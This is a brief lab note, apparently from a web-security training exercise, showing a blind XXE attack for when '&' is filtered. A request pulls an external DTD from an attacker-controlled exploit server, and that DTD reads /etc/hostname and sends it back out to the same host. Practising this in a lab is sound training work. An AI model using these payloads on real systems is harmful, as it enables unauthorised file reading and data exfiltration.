## if '&' is blocked
then host your exploit on your server and make the target web server fetch XML DTD from your server.
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test[
	<!ENTITY % get SYSTEM "http://exploit-0a600012043f232f8275050d0118003a.exploit-server.net/exploit">
	%get;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>


----------- On my server -------------- make the content type application/xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % expand "<!ENTITY &#x25; sender SYSTEM 'http://exploit-0a600012043f232f8275050d0118003a.exploit-server.net?x=%file;'>" >
%expand;
%sender;
```
